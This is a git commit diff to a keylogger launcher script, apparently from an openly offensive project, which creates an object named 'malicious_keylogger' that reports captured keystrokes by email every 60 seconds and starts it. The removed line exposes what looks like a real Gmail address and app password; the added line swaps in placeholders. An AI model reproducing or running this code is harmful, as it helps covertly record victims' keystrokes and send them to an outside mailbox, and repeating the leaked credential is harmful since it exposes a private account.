38b6cb0fda33830eecf1207d891d2713ab638e7f
amanmaner011 <97833750+amanmaner011@users.noreply.github.com>
2024-01-18 19:06:12 +0530

    Update execute_keylogger.py

--- src/execute_keylogger.py
+++ src/execute_keylogger.py
@@ -1,14 +1,10 @@
 #!/usr/bin/env python
-
 import keylogger
-
 
 # Initialize / create keylogger
 import keylogger
 
-
-malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, 'blacksmith8983@gmail.com', 'mgqbgygktbvygefs')
+malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, 'enter your email address', 'enter password for the same')
 
 # Execute Keylogger
-
 malicious_keylogger.start()
